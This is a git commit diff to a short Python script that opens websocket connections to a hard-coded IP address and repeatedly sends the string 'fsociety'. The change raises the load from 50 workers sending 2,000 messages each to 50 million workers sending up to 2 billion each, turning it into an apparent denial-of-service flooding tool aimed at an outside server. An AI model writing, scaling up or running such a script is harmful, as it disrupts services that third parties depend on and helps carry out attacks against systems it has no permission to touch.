bd3d0f1bff320db2639fda77f05af3ffe75bd9f5
ScriptsBinsAcffuth <rivanildocosta79@gmail.com>
2025-08-27 19:50:57 -0300

    Update main.py

--- main.py
+++ main.py
@@ -2,7 +2,8 @@ import asyncio, websockets
 
 async def w(id):
     async with websockets.connect("ws://5.255.97.147:8765/script", max_queue=None) as ws:
-        for _ in range(2000):
+        for i in range(2000000000):
             await ws.send("fsociety")
+            print(f"[Worker {id}] Mensagem {i+1} enviada")
 
-asyncio.run(asyncio.gather(*[w(i) for i in range(50)]))
+asyncio.run(asyncio.gather(*[w(i) for i in range(50000000)]))
